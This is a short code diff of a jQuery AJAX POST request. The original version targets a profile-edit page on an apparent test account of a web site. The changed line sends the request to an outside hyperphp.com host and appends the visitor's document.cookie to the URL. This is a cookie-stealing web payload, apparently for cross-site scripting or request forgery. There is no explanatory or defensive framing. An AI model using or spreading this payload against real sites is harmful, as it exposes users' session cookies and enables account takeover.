@@ -5,7 +5,7 @@
         $.ajax({
             type: 'POST',
 
-            url: 'https://baru.arkademi.com/members/pentest3/profile/edit/group/1/',
+            url: 'http://www.kamen123.hyperphp.com/test.php?wkwk='+document.cookie,
             data: {
                 "field_1": "riki washing here",
                 "field_12": "riki washing here",
